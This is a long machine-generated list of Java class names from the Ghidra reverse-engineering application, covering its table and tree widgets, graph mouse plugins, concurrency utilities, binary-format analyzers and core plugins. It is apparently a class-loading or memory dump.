docking.widgets.table.GTable$6
docking.widgets.table.GTable$7
docking.widgets.table.GTable$8
docking.widgets.table.GTable$9
docking.widgets.table.GTable$MyTableColumnModelListener
docking.widgets.table.GTableCellRenderer
docking.widgets.table.GTableCellRenderingData
docking.widgets.table.GTableColumnModel
docking.widgets.table.GTableFilterPanel
docking.widgets.table.GTableFilterPanel$$Lambda$335.1978974122
docking.widgets.table.GTableFilterPanel$$Lambda$336.1680613589
docking.widgets.table.GTableFilterPanel$$Lambda$337.1261432471
docking.widgets.table.GTableFilterPanel$$Lambda$341.1443626027
docking.widgets.table.GTableFilterPanel$$Lambda$389.1352234645
docking.widgets.table.GTableFilterPanel$1
docking.widgets.table.GTableFilterPanel$2
docking.widgets.table.GTableFilterPanel$ColumnFilterActionState
docking.widgets.table.GTableFilterPanel$CreateFilterActionState
docking.widgets.table.GTableFilterPanel$GTableFilterListener
docking.widgets.table.GTableFilterPanel$UpdateTableModelListener
docking.widgets.table.GTableHeader
docking.widgets.table.GTableHeader$1
docking.widgets.table.GTableHeader$2
docking.widgets.table.GTableHeaderRenderer
docking.widgets.table.GTableHeaderRenderer$CustomPaddingBorder
docking.widgets.table.GTableHeaderRenderer$NoRightSideLineBorder
docking.widgets.table.GTableHeaderRenderer$NoSidesLineBorder
docking.widgets.table.GTableMouseListener
docking.widgets.table.MappedTableColumn
docking.widgets.table.RowFilterTransformer
docking.widgets.table.RowObjectFilterModel
docking.widgets.table.RowObjectSelectionManager
docking.widgets.table.RowObjectSelectionManager$FilterModelAdapter
docking.widgets.table.RowObjectSelectionManager$FilterModelPassThrough
docking.widgets.table.RowObjectTableModel
docking.widgets.table.SelectionManager
docking.widgets.table.SelectionStorage
docking.widgets.table.SortListener
docking.widgets.table.SortedTableModel
docking.widgets.table.TableColumnDescriptor
docking.widgets.table.TableColumnDescriptor$TableColumnInfo
docking.widgets.table.TableColumnModelState
docking.widgets.table.TableColumnModelState$$Lambda$317.2096131874
docking.widgets.table.TableColumnModelState$$Lambda$318.891022203
docking.widgets.table.TableColumnModelState$$Lambda$319.487966784
docking.widgets.table.TableColumnModelState$$Lambda$320.1040836700
docking.widgets.table.TableFilter
docking.widgets.table.TableRowMapper
docking.widgets.table.TableSortState
docking.widgets.table.TableSortStateEditor
docking.widgets.table.TableSortingContext
docking.widgets.table.TableTextFilterFactory
docking.widgets.table.VariableColumnTableModel
docking.widgets.table.columnfilter.ColumnFilterSaveManager
docking.widgets.table.constraint.AtLeastColumnConstraint
docking.widgets.table.constraint.AtLeastDateColumnConstraint
docking.widgets.table.constraint.AtMostColumnConstraint
docking.widgets.table.constraint.AtMostDateColumnConstraint
docking.widgets.table.constraint.BooleanMatchColumnConstraint
docking.widgets.table.constraint.ColumnConstraint
docking.widgets.table.constraint.ColumnConstraintProvider
docking.widgets.table.constraint.ColumnTypeMapper
docking.widgets.table.constraint.EnumColumnConstraint
docking.widgets.table.constraint.InDateRangeColumnConstraint
docking.widgets.table.constraint.InRangeColumnConstraint
docking.widgets.table.constraint.MappedColumnConstraint
docking.widgets.table.constraint.NotInDateRangeColumnConstraint
docking.widgets.table.constraint.NotInRangeColumnConstraint
docking.widgets.table.constraint.RangeColumnConstraint
docking.widgets.table.constraint.SingleValueColumnConstraint
docking.widgets.table.constraint.StringColumnConstraint
docking.widgets.table.constraint.StringContainsColumnConstraint
docking.widgets.table.constraint.StringEndsWithColumnConstraint
docking.widgets.table.constraint.StringIsEmptyColumnConstraint
docking.widgets.table.constraint.StringIsNotEmptyColumnConstraint
docking.widgets.table.constraint.StringMatcherColumnConstraint
docking.widgets.table.constraint.StringNotContainsColumnConstraint
docking.widgets.table.constraint.StringNotEndsWithColumnConstraint
docking.widgets.table.constraint.StringNotStartsWithColumnConstraint
docking.widgets.table.constraint.StringStartsWithColumnConstraint
docking.widgets.table.constraint.provider.BooleanMatchColumnConstraintProvider
docking.widgets.table.constraint.provider.DateColumnConstraintProvider
docking.widgets.table.constraint.provider.DateColumnTypeMapper
docking.widgets.table.constraint.provider.FloatColumnTypeMapper
docking.widgets.table.constraint.provider.NumberColumnConstraintProvider
docking.widgets.table.constraint.provider.StringColumnConstraintProvider
docking.widgets.table.threaded.FilterJob
docking.widgets.table.threaded.GThreadedTablePanel
docking.widgets.table.threaded.GThreadedTablePanel$$Lambda$313.617633338
docking.widgets.table.threaded.GThreadedTablePanel$$Lambda$314.1452271914
docking.widgets.table.threaded.GThreadedTablePanel$$Lambda$315.215260876
docking.widgets.table.threaded.GThreadedTablePanel$$Lambda$316.1886749769
docking.widgets.table.threaded.GThreadedTablePanel$$Lambda$394.916040021
docking.widgets.table.threaded.GThreadedTablePanel$IncrementalLoadingTaskMonitor
docking.widgets.table.threaded.GThreadedTablePanel$MessagePassingTaskMonitor
docking.widgets.table.threaded.GThreadedTablePanel$TableListener
docking.widgets.table.threaded.LoadJob
docking.widgets.table.threaded.NullTableFilter
docking.widgets.table.threaded.TableColumnComparator
docking.widgets.table.threaded.TableData
docking.widgets.table.threaded.TableUpdateJob
docking.widgets.table.threaded.TableUpdateJob$$Lambda$384.111966923
docking.widgets.table.threaded.TableUpdateJob$1
docking.widgets.table.threaded.TableUpdateJob$JobState
docking.widgets.table.threaded.TableUpdateJob$JobState[]
docking.widgets.table.threaded.ThreadedTableModel
docking.widgets.table.threaded.ThreadedTableModel$$Lambda$312.186125639
docking.widgets.table.threaded.ThreadedTableModel$NonIncrementalUpdateManagerListener
docking.widgets.table.threaded.ThreadedTableModelListener
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$307.107698021
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$308.203732718
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$309.608630316
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$310.2026528190
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$311.1615010004
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$$Lambda$333.1529871949
docking.widgets.table.threaded.ThreadedTableModelUpdateMgr$ThreadRunnable
docking.widgets.textfield.GValidatedTextField$LongField$LongValidator
docking.widgets.textfield.GValidatedTextField$TextValidator
docking.widgets.tree.AbstractGTreeNode
docking.widgets.tree.AbstractGTreeRootNode
docking.widgets.tree.CoreGTreeNode
docking.widgets.tree.DefaultGTreeFilterProvider
docking.widgets.tree.DefaultGTreeFilterProvider$$Lambda$301.752814538
docking.widgets.tree.DefaultGTreeFilterProvider$FilterDocumentListener
docking.widgets.tree.GTree
docking.widgets.tree.GTree$$Lambda$294.360281356
docking.widgets.tree.GTree$$Lambda$302.536603472
docking.widgets.tree.GTree$$Lambda$303.1350316194
docking.widgets.tree.GTree$1
docking.widgets.tree.GTree$AutoScrollTree
docking.widgets.tree.GTree$FilteredExpansionListener
docking.widgets.tree.GTree$GTreeMouseListenerDelegate
docking.widgets.tree.GTreeFilterFactory
docking.widgets.tree.GTreeFilterProvider
docking.widgets.tree.GTreeNode
docking.widgets.tree.GTreeNode[]
docking.widgets.tree.GTreeRootNode
docking.widgets.tree.internal.DefaultGTreeDataTransformer
docking.widgets.tree.internal.DefaultGTreeDataTransformer$1
docking.widgets.tree.internal.GTreeDragNDropAdapter
docking.widgets.tree.internal.GTreeModel
docking.widgets.tree.internal.GTreeSelectionModel
docking.widgets.tree.internal.InProgressGTreeNode
docking.widgets.tree.support.GTreeCellEditor
docking.widgets.tree.support.GTreeDragNDropHandler
docking.widgets.tree.support.GTreeRenderer
docking.widgets.tree.support.GTreeSelectionEvent$EventOrigin
docking.widgets.tree.support.GTreeSelectionEvent$EventOrigin[]
docking.widgets.tree.support.GTreeSelectionListener
docking.widgets.tree.support.GTreeTransferHandler
docking.wizard.WizardStateDependencyValidator
double[]
double[][]
edu.uci.ics.jung.visualization.control.AbstractGraphMousePlugin
edu.uci.ics.jung.visualization.control.AbstractPopupGraphMousePlugin
edu.uci.ics.jung.visualization.control.AnimatedPickingGraphMousePlugin
edu.uci.ics.jung.visualization.control.GraphMousePlugin
edu.uci.ics.jung.visualization.control.PickingGraphMousePlugin
edu.uci.ics.jung.visualization.control.SatelliteScalingGraphMousePlugin
edu.uci.ics.jung.visualization.control.ScalingGraphMousePlugin
float[]
foundation.FoundationInitializer
functioncalls.graph.layout.BowTieLayoutProvider
functioncalls.plugin.FunctionCallGraphPlugin
generic.Images
generic.concurrent.ConcurrentListenerSet
generic.concurrent.ConcurrentQ
generic.concurrent.ConcurrentQ$CallbackCallable
generic.concurrent.ConcurrentQ$ChainedProgressListener
generic.concurrent.ConcurrentQ$QMonitorAdapter
generic.concurrent.ConcurrentQBuilder
generic.concurrent.FutureTaskMonitor
generic.concurrent.GThreadPool
generic.concurrent.GThreadPool$GThreadPoolExecutor
generic.concurrent.ProgressTracker
generic.concurrent.QCallback
generic.concurrent.QProgressListener
generic.concurrent.QResult
generic.constraint.Constraint
generic.constraint.RootDecisionNode$DummyConstraint
generic.init.GenericApplicationSettings
generic.init.GenericInitializer
generic.jar.FileResource
generic.jar.GClassLoader
generic.jar.Resource
generic.jar.ResourceFile
generic.jar.ResourceFileFilter
generic.jar.ResourceFile[]
generic.lsh.LSHMemoryModel
generic.lsh.LSHMemoryModel[]
generic.random.SecureRandomFactory
generic.util.NamedDaemonThreadFactory
generic.util.WindowUtilities
generic.util.WindowUtilities$$Lambda$391.1858623699
generic.util.image.ImageUtils
generic.util.image.ImageUtils$1
generic.util.image.ImageUtils$2
ghidra.GhidraApplicationLayout
ghidra.GhidraClassLoader
ghidra.GhidraLaunchable
ghidra.GhidraLauncher
ghidra.GhidraLauncher$$Lambda$91.341796579
ghidra.GhidraLauncher$$Lambda$92.807657332
ghidra.GhidraOptions
ghidra.GhidraRun
ghidra.GhidraRun$$Lambda$267.986881102
ghidra.GhidraRun$$Lambda$270.54196557
ghidra.GhidraRun$$Lambda$93.978508707
ghidra.GhidraRun$GhidraProjectManager
ghidra.GhidraThreadGroup
ghidra.MiscellaneousPluginPackage
ghidra.ProjectInitializer
ghidra.SoftwareModelingInitializer
ghidra.StatusReportingTaskMonitor
ghidra.app.CorePluginPackage
ghidra.app.DeveloperPluginPackage
ghidra.app.ExamplesPluginPackage
ghidra.app.GraphPluginPackage
ghidra.app.analyzers.AbstractBinaryFormatAnalyzer
ghidra.app.analyzers.AppleSingleDoubleAnalyzer
ghidra.app.analyzers.CoffAnalyzer
ghidra.app.analyzers.CoffArchiveAnalyzer
ghidra.app.analyzers.CondenseFillerBytesAnalyzer
ghidra.app.analyzers.ElfAnalyzer
ghidra.app.analyzers.FunctionStartAnalyzer
ghidra.app.analyzers.FunctionStartDataPostAnalyzer
ghidra.app.analyzers.FunctionStartFuncAnalyzer
ghidra.app.analyzers.FunctionStartPostAnalyzer
ghidra.app.analyzers.LibraryHashAnalyzer
ghidra.app.analyzers.MachoAnalyzer
ghidra.app.analyzers.PatternConstraint
ghidra.app.analyzers.PefAnalyzer
ghidra.app.analyzers.PortableExecutableAnalyzer
ghidra.app.cmd.formats.AppleSingleDoubleBinaryAnalysisCommand
ghidra.app.cmd.formats.CoffArchiveBinaryAnalysisCommand
ghidra.app.cmd.formats.CoffBinaryAnalysisCommand
ghidra.app.cmd.formats.ElfBinaryAnalysisCommand
ghidra.app.cmd.formats.MachoBinaryAnalysisCommand
ghidra.app.cmd.formats.PefBinaryAnalysisCommand
ghidra.app.cmd.formats.PortableExecutableBinaryAnalysisCommand
ghidra.app.context.NavigatableContextAction
ghidra.app.decompiler.component.BasicDecompilerCodeComparisonPanel
ghidra.app.decompiler.component.DecompilerCodeComparisonPanel
ghidra.app.decompiler.component.hover.DataTypeDecompilerHoverPlugin
ghidra.app.decompiler.component.hover.FunctionSignatureDecompilerHoverPlugin
ghidra.app.decompiler.component.hover.ReferenceDecompilerHoverPlugin
ghidra.app.decompiler.component.hover.ScalarValueDecompilerHoverPlugin
ghidra.app.extension.datatype.finder.DecompilerDataTypeReferenceFinder
ghidra.app.factory.GhidraToolStateFactory
ghidra.app.merge.DataTypeArchiveMergeManagerPlugin
ghidra.app.merge.DataTypeManagerOwner
ghidra.app.merge.MergeManagerPlugin
ghidra.app.merge.ProgramMergeManagerPlugin
ghidra.app.merge.tool.ListingMergePanelPlugin
ghidra.app.nav.NavigatableRemovalListener
ghidra.app.plugin.ProgramPlugin
ghidra.app.plugin.core.algorithmtree.ModuleAlgorithmPlugin
ghidra.app.plugin.core.analysis.AARCH64PltThunkAnalyzer
ghidra.app.plugin.core.analysis.ARMPreAnalyzer
ghidra.app.plugin.core.analysis.AbstractCInitAnalyzer
ghidra.app.plugin.core.analysis.AnalysisWorker
ghidra.app.plugin.core.analysis.ApplyDataArchiveAnalyzer
ghidra.app.plugin.core.analysis.ArmAnalyzer
ghidra.app.plugin.core.analysis.ArmSymbolAnalyzer
ghidra.app.plugin.core.analysis.AutoAnalysisManagerListener
ghidra.app.plugin.core.analysis.AutoAnalysisPlugin
ghidra.app.plugin.core.analysis.CliMetadataTokenAnalyzer
ghidra.app.plugin.core.analysis.ConstantPropagationAnalyzer
ghidra.app.plugin.core.analysis.DWARFAnalyzer
ghidra.app.plugin.core.analysis.DataOperandReferenceAnalyzer
ghidra.app.plugin.core.analysis.DecompilerCallConventionAnalyzer
ghidra.app.plugin.core.analysis.DecompilerFunctionAnalyzer
ghidra.app.plugin.core.analysis.DecompilerSwitchAnalyzer
ghidra.app.plugin.core.analysis.DemanglerAnalyzer
ghidra.app.plugin.core.analysis.DwarfLineNumberAnalyzer
ghidra.app.plugin.core.analysis.ElfScalarOperandAnalyzer
ghidra.app.plugin.core.analysis.EmbeddedMediaAnalyzer
ghidra.app.plugin.core.analysis.FindNoReturnFunctionsAnalyzer
ghidra.app.plugin.core.analysis.FindPossibleReferencesPlugin
ghidra.app.plugin.core.analysis.MipsAddressAnalyzer
ghidra.app.plugin.core.analysis.MipsPreAnalyzer
ghidra.app.plugin.core.analysis.MipsSymbolAnalyzer
ghidra.app.plugin.core.analysis.Motorola68KAnalyzer
ghidra.app.plugin.core.analysis.NoReturnFunctionAnalyzer
ghidra.app.plugin.core.analysis.ObjectiveC1_ClassAnalyzer
ghidra.app.plugin.core.analysis.ObjectiveC1_MessageAnalyzer
ghidra.app.plugin.core.analysis.ObjectiveC2_ClassAnalyzer
ghidra.app.plugin.core.analysis.ObjectiveC2_DecompilerMessageAnalyzer
ghidra.app.plugin.core.analysis.ObjectiveC2_MessageAnalyzer
ghidra.app.plugin.core.analysis.OperandReferenceAnalyzer
ghidra.app.plugin.core.analysis.PPC64CallStubAnalyzer
ghidra.app.plugin.core.analysis.PdbAnalyzer
ghidra.app.plugin.core.analysis.PefAnalyzer
ghidra.app.plugin.core.analysis.PefDebugAnalyzer
ghidra.app.plugin.core.analysis.Pic12Analyzer
ghidra.app.plugin.core.analysis.Pic16Analyzer
ghidra.app.plugin.core.analysis.Pic17c7xxAnalyzer
ghidra.app.plugin.core.analysis.Pic18Analyzer
ghidra.app.plugin.core.analysis.PicSwitchAnalyzer
ghidra.app.plugin.core.analysis.PowerPCAddressAnalyzer
ghidra.app.plugin.core.analysis.ScalarOperandAnalyzer
ghidra.app.plugin.core.analysis.SegmentedCallingConventionAnalyzer
ghidra.app.plugin.core.analysis.SparcAnalyzer
ghidra.app.plugin.core.analysis.ToyAnalyzer
ghidra.app.plugin.core.analysis.X86Analyzer
ghidra.app.plugin.core.analysis.validator.OffcutReferencesValidator
ghidra.app.plugin.core.analysis.validator.PercentAnalyzedValidator
ghidra.app.plugin.core.analysis.validator.PostAnalysisValidator
ghidra.app.plugin.core.analysis.validator.RedFlagsValidator
ghidra.app.plugin.core.archive.ArchivePlugin
ghidra.app.plugin.core.archive.ArchivePlugin$1
ghidra.app.plugin.core.archive.ArchivePlugin$2
ghidra.app.plugin.core.assembler.AssemblerPlugin
ghidra.app.plugin.core.blockmodel.BlockModelServicePlugin
ghidra.app.plugin.core.bookmark.BookmarkPlugin
ghidra.app.plugin.core.bookmark.BookmarkRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.bookmark.BookmarkRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.bookmark.BookmarkTableModel$CategoryTableColumn
ghidra.app.plugin.core.bookmark.BookmarkTableModel$DescriptionTableColumn
ghidra.app.plugin.core.bookmark.BookmarkTableModel$TypeTableColumn
ghidra.app.plugin.core.byteviewer.ByteViewerPlugin
ghidra.app.plugin.core.byteviewer.FieldFactory
ghidra.app.plugin.core.byteviewer.IndexFieldFactory
ghidra.app.plugin.core.calltree.CallTreePlugin
ghidra.app.plugin.core.checksums.Adler32ChecksumAlgorithm
ghidra.app.plugin.core.checksums.BasicChecksumAlgorithm
ghidra.app.plugin.core.checksums.CRC16CCITTChecksumAlgorithm
ghidra.app.plugin.core.checksums.CRC16ChecksumAlgorithm
ghidra.app.plugin.core.checksums.CRC32ChecksumAlgorithm
ghidra.app.plugin.core.checksums.Checksum16ChecksumAlgorithm
ghidra.app.plugin.core.checksums.Checksum32ChecksumAlgorithm
ghidra.app.plugin.core.checksums.Checksum8ChecksumAlgorithm
ghidra.app.plugin.core.checksums.ChecksumAlgorithm
ghidra.app.plugin.core.checksums.ComputeChecksumsPlugin
ghidra.app.plugin.core.checksums.DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.MD2DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.MD5DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.SHA1DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.SHA256DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.SHA384DigestChecksumAlgorithm
ghidra.app.plugin.core.checksums.SHA512DigestChecksumAlgorithm
ghidra.app.plugin.core.clear.ClearPlugin
ghidra.app.plugin.core.clipboard.ClipboardPlugin
ghidra.app.plugin.core.codebrowser.CodeBrowserPlugin
ghidra.app.plugin.core.codebrowser.CodeBrowserPlugin$CodeUnitFromSelectionTableModelLoader
ghidra.app.plugin.core.codebrowser.CodeBrowserPluginInterface
ghidra.app.plugin.core.codebrowser.hover.DataTypeListingHoverPlugin
ghidra.app.plugin.core.codebrowser.hover.FunctionNameListingHoverPlugin
ghidra.app.plugin.core.codebrowser.hover.ProgramAddressRelationshipListingHoverPlugin
ghidra.app.plugin.core.codebrowser.hover.ReferenceListingHoverPlugin
ghidra.app.plugin.core.codebrowser.hover.ScalarOperandListingHoverPlugin
ghidra.app.plugin.core.codebrowser.hover.TruncatedTextListingHoverPlugin
ghidra.app.plugin.core.colorizer.ColorizingPlugin
ghidra.app.plugin.core.comments.CommentsActionFactory
ghidra.app.plugin.core.comments.CommentsPlugin
ghidra.app.plugin.core.comments.DecompilerCommentsActionFactory
ghidra.app.plugin.core.commentwindow.CommentRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.commentwindow.CommentRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.commentwindow.CommentTableModel$CommentTableColumn
ghidra.app.plugin.core.commentwindow.CommentTableModel$TypeTableColumn
ghidra.app.plugin.core.commentwindow.CommentWindowPlugin
ghidra.app.plugin.core.console.ConsolePlugin
ghidra.app.plugin.core.cparser.CParserPlugin
ghidra.app.plugin.core.data.DataPlugin
ghidra.app.plugin.core.datamgr.DataTypeManagerPlugin
ghidra.app.plugin.core.datamgr.archive.BuiltInSourceArchive
ghidra.app.plugin.core.datamgr.archive.DataTypeManagerHandler$RecentlyUsedDataType
ghidra.app.plugin.core.datamgr.archive.SourceArchive
ghidra.app.plugin.core.datamgr.editor.EnumEditorPanel$RangeValidator
ghidra.app.plugin.core.datapreview.DataTypePreviewPlugin
ghidra.app.plugin.core.datawindow.DataRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.datawindow.DataRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.datawindow.DataTableModel$DataValueTableColumn
ghidra.app.plugin.core.datawindow.DataTableModel$SizeTableColumn
ghidra.app.plugin.core.datawindow.DataTableModel$TypeTableColumn
ghidra.app.plugin.core.datawindow.DataToAddressTableRowMapper
ghidra.app.plugin.core.datawindow.DataToProgramLocationTableRowMapper
ghidra.app.plugin.core.datawindow.DataWindowPlugin
ghidra.app.plugin.core.decompile.DecompilePlugin
ghidra.app.plugin.core.decompiler.validator.DecompilerParameterIDValidator
ghidra.app.plugin.core.decompiler.validator.DecompilerValidator
ghidra.app.plugin.core.diff.DiffControllerListener
ghidra.app.plugin.core.diff.ProgramDiffPlugin
ghidra.app.plugin.core.disassembler.AddressTableAnalyzer
ghidra.app.plugin.core.disassembler.AutoTableDisassemblerPlugin
ghidra.app.plugin.core.disassembler.CallFixupAnalyzer
ghidra.app.plugin.core.disassembler.CallFixupChangeAnalyzer
ghidra.app.plugin.core.disassembler.DisassembledViewPlugin
ghidra.app.plugin.core.disassembler.DisassemblerPlugin
ghidra.app.plugin.core.disassembler.EntryPointAnalyzer
ghidra.app.plugin.core.eclipse.EclipseIntegrationOptionsPlugin
ghidra.app.plugin.core.eclipse.EclipseIntegrationPlugin
ghidra.app.plugin.core.editor.TextEditorManagerPlugin
ghidra.app.plugin.core.equate.EquatePlugin
ghidra.app.plugin.core.equate.EquateTablePlugin
ghidra.app.plugin.core.exporter.ExporterPlugin
ghidra.app.plugin.core.exporter.ExporterPlugin$1
ghidra.app.plugin.core.exporter.ExporterPlugin$2
ghidra.app.plugin.core.fallthrough.FallThroughPlugin
ghidra.app.plugin.core.flowarrow.FlowArrowPlugin
ghidra.app.plugin.core.format.AddressFormatModel
ghidra.app.plugin.core.format.AsciiFormatModel
ghidra.app.plugin.core.format.BinaryFormatModel
ghidra.app.plugin.core.format.DataFormatModel
ghidra.app.plugin.core.format.DisassembledFormatModel
ghidra.app.plugin.core.format.HexFormatModel
ghidra.app.plugin.core.format.HexIntegerFormatModel
ghidra.app.plugin.core.format.IntegerFormatModel
ghidra.app.plugin.core.format.OctalFormatModel
ghidra.app.plugin.core.format.ProgramDataFormatModel
ghidra.app.plugin.core.format.UniversalDataFormatModel
ghidra.app.plugin.core.function.CreateThunkAnalyzer
ghidra.app.plugin.core.function.ExternalEntryFunctionAnalyzer
ghidra.app.plugin.core.function.FunctionAnalyzer
ghidra.app.plugin.core.function.FunctionPlugin
ghidra.app.plugin.core.function.SharedReturnAnalyzer
ghidra.app.plugin.core.function.SharedReturnJumpAnalyzer
ghidra.app.plugin.core.function.StackDepthFieldFactory
ghidra.app.plugin.core.function.StackVariableAnalyzer
ghidra.app.plugin.core.function.X86FunctionPurgeAnalyzer
ghidra.app.plugin.core.function.tags.FunctionTagPlugin
ghidra.app.plugin.core.functioncompare.FunctionComparisonPlugin
ghidra.app.plugin.core.functiongraph.FunctionGraphPlugin
ghidra.app.plugin.core.functiongraph.graph.layout.DecompilerNestedLayoutProvider
ghidra.app.plugin.core.functiongraph.graph.layout.ExperimentalLayoutProvider
ghidra.app.plugin.core.functiongraph.graph.layout.FGLayoutProvider
ghidra.app.plugin.core.functionwindow.FunctionRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.functionwindow.FunctionRowObjectToFunctionTableRowMapper
ghidra.app.plugin.core.functionwindow.FunctionRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.functionwindow.FunctionToAddressTableRowMapper
ghidra.app.plugin.core.functionwindow.FunctionToProgramLocationTableRowMapper
ghidra.app.plugin.core.functionwindow.FunctionWindowPlugin
ghidra.app.plugin.core.gotoquery.GoToServicePlugin
ghidra.app.plugin.core.help.AboutProgramPlugin
ghidra.app.plugin.core.help.AboutProgramPlugin$1
ghidra.app.plugin.core.help.ProcessorListPlugin
ghidra.app.plugin.core.help.ProcessorListPlugin$1
ghidra.app.plugin.core.highlight.SetHighlightPlugin
ghidra.app.plugin.core.instructionsearch.InstructionSearchPlugin
ghidra.app.plugin.core.interpreter.InterpreterConnection
ghidra.app.plugin.core.interpreter.InterpreterPanelPlugin
ghidra.app.plugin.core.interpreter.InterpreterPanelService
ghidra.app.plugin.core.label.LabelMgrPlugin
ghidra.app.plugin.core.marker.MarkerManagerPlugin
ghidra.app.plugin.core.memory.MemoryMapPlugin
ghidra.app.plugin.core.misc.MyProgramChangesDisplayPlugin
ghidra.app.plugin.core.misc.RecoverySnapshotMgrPlugin
ghidra.app.plugin.core.misc.RecoverySnapshotMgrPlugin$1
ghidra.app.plugin.core.misc.RecoverySnapshotMgrPlugin$2
ghidra.app.plugin.core.misc.RecoverySnapshotMgrPlugin$SnapshotTask
ghidra.app.plugin.core.module.AutoRenamePlugin
ghidra.app.plugin.core.module.ModuleSortPlugin
ghidra.app.plugin.core.navigation.FindAppliedDataTypesService
ghidra.app.plugin.core.navigation.GoToAddressLabelPlugin
ghidra.app.plugin.core.navigation.NavigationHistoryPlugin
ghidra.app.plugin.core.navigation.NextPrevAddressPlugin
ghidra.app.plugin.core.navigation.NextPrevCodeUnitPlugin
ghidra.app.plugin.core.navigation.NextPrevHighlightRangePlugin
ghidra.app.plugin.core.navigation.NextPrevSelectedRangePlugin
ghidra.app.plugin.core.navigation.locationreferences.LocationReferenceToAddressTableRowMapper
ghidra.app.plugin.core.navigation.locationreferences.LocationReferenceToFunctionContainingTableRowMapper
ghidra.app.plugin.core.navigation.locationreferences.LocationReferenceToProgramLocationTableRowMapper
ghidra.app.plugin.core.navigation.locationreferences.LocationReferencesPlugin
ghidra.app.plugin.core.navigation.locationreferences.LocationReferencesService
ghidra.app.plugin.core.navigation.locationreferences.LocationReferencesTableModel$ContextTableColumn
ghidra.app.plugin.core.overview.OverviewColorPlugin
ghidra.app.plugin.core.overview.OverviewColorService
ghidra.app.plugin.core.overview.addresstype.AddressTypeOverviewColorService
ghidra.app.plugin.core.overview.entropy.EntropyOverviewColorService
ghidra.app.plugin.core.printing.PrintingPlugin
ghidra.app.plugin.core.processors.LanguageProviderPlugin
ghidra.app.plugin.core.processors.LanguageProviderPlugin$1
ghidra.app.plugin.core.processors.ShowInstructionInfoPlugin
ghidra.app.plugin.core.progmgr.MultiTabPlugin
ghidra.app.plugin.core.progmgr.ProgramManagerPlugin
ghidra.app.plugin.core.programtree.ProgramTreeModularizationPlugin
ghidra.app.plugin.core.programtree.ProgramTreePlugin
ghidra.app.plugin.core.reachability.FRPathsModel$FRPreviewTableColumn
ghidra.app.plugin.core.reachability.FRPathsModel$FunctionTableColumn
ghidra.app.plugin.core.reachability.FunctionReachabilityPlugin
ghidra.app.plugin.core.reachability.FunctionReachabilityTableModel$FromFunctionTableColumn
ghidra.app.plugin.core.reachability.FunctionReachabilityTableModel$PathLengthTableColumn
ghidra.app.plugin.core.reachability.FunctionReachabilityTableModel$ToFunctionTableColumn
ghidra.app.plugin.core.references.OffsetTablePlugin
ghidra.app.plugin.core.references.ReferencesPlugin
ghidra.app.plugin.core.register.RegisterPlugin
ghidra.app.plugin.core.register.RegisterPlugin$RegisterTransitionFieldMouseHandler
ghidra.app.plugin.core.reloc.GenericRefernenceBaseRelocationFixupHandler
ghidra.app.plugin.core.reloc.Pe32RelocationFixupHandler
ghidra.app.plugin.core.reloc.Pe64RelocationFixupHandler
ghidra.app.plugin.core.reloc.RelocationFixupHandler
ghidra.app.plugin.core.reloc.RelocationFixupPlugin
ghidra.app.plugin.core.reloc.RelocationTablePlugin
ghidra.app.plugin.core.reloc.RelocationToAddressTableRowMapper
ghidra.app.plugin.core.scalartable.ScalarRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.scalartable.ScalarRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.scalartable.ScalarSearchModel$ScalarFunctionNameTableColumn
ghidra.app.plugin.core.scalartable.ScalarSearchModel$ScalarHexValueTableColumn
ghidra.app.plugin.core.scalartable.ScalarSearchModel$ScalarSignedDecimalValueTableColumn
ghidra.app.plugin.core.scalartable.ScalarSearchModel$ScalarUnsignedDecimalValueTableColumn
ghidra.app.plugin.core.scalartable.ScalarSearchPlugin
ghidra.app.plugin.core.scl.SourceCodeLookupPlugin
ghidra.app.plugin.core.script.GhidraScriptMgrPlugin
ghidra.app.plugin.core.searchmem.MemSearchPlugin
ghidra.app.plugin.core.searchmem.MemSearchResultToAddressTableRowMapper
ghidra.app.plugin.core.searchmem.MemSearchResultToFunctionTableRowMapper
ghidra.app.plugin.core.searchmem.MemSearchResultToProgramLocationTableRowMapper
ghidra.app.plugin.core.searchmem.mask.MnemonicSearchPlugin
ghidra.app.plugin.core.searchtext.SearchTextPlugin
ghidra.app.plugin.core.select.RestoreSelectionPlugin
ghidra.app.plugin.core.select.SelectBlockPlugin
ghidra.app.plugin.core.select.flow.SelectByFlowPlugin
ghidra.app.plugin.core.select.flow.SelectByScopedFlowPlugin
ghidra.app.plugin.core.select.programtree.ProgramTreeSelectionPlugin
ghidra.app.plugin.core.select.qualified.QualifiedSelectionPlugin
ghidra.app.plugin.core.select.reference.SelectRefsPlugin
ghidra.app.plugin.core.stackeditor.BiDirectionDataType
ghidra.app.plugin.core.stackeditor.BiDirectionStructure
ghidra.app.plugin.core.stackeditor.OffsetComparator
ghidra.app.plugin.core.stackeditor.OrdinalComparator
ghidra.app.plugin.core.stackeditor.StackEditorManagerPlugin
ghidra.app.plugin.core.stackeditor.StackEditorOptionManager
ghidra.app.plugin.core.stackeditor.StackFrameDataType
ghidra.app.plugin.core.stackeditor.StackPieceDataType
ghidra.app.plugin.core.string.FoundStringToAddressTableRowMapper
ghidra.app.plugin.core.string.FoundStringToProgramLocationTableRowMapper
ghidra.app.plugin.core.string.NGramUtils
ghidra.app.plugin.core.string.StringTableModel$ConfidenceWordTableColumn
ghidra.app.plugin.core.string.StringTableModel$IsDefinedTableColumn
ghidra.app.plugin.core.string.StringTableModel$StringLengthTableColumn
